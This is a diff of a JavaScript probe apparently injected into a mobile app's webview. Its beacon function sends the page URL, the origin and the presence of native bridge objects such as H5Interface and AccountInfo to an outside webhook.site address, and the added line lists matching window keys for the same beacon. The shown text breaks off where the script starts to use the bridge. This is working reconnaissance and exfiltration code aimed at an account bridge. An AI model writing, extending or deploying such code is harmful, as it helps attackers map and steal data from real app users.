@@ -2,6 +2,7 @@
 var C='https://webhook.site/4ee48446-1373-432b-ba15-292bd3f81eb8';
 var T=Date.now();
 function b(t,d){new Image().src=C+'?t='+encodeURIComponent(t)+'&d='+encodeURIComponent(String(d||'').substring(0,2000))+'&ts='+T;}
+  
 
 b('START','v22.2.00.02');
 b('URL',location.href.substring(0,400));
@@ -9,6 +10,7 @@ b('ORIGIN',location.origin);
 b('H5I',typeof H5Interface);
 b('ACCT',typeof AccountInfo);
 b('AWC',typeof AppWebClient);
+b('BRIDGE_KEYS', Object.keys(window).filter(k=>k.includes('Interface')||k.includes('Account')||k.includes('Client')).join(','));
 
 var bridge = window.H5Interface || window.AccountInfo;
 if(bridge){
